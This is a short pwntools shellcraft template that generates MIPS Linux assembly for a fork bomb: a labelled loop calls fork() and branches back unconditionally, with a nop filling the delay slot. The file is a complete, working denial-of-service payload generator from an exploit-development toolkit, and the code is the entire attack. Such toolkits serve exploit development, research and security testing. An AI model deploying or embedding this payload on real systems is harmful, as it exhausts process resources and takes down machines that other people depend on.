<%
    from pwnlib.shellcraft.mips import nop
    from pwnlib.shellcraft.mips.linux import fork
    from pwnlib.shellcraft.common import label
%>
<%docstring>
Performs a forkbomb attack.
</%docstring>
<%
    dosloop = label('fork_bomb')
%>
${dosloop}:
    ${fork()}
    beq $at, $at, ${dosloop}
    ${nop()}
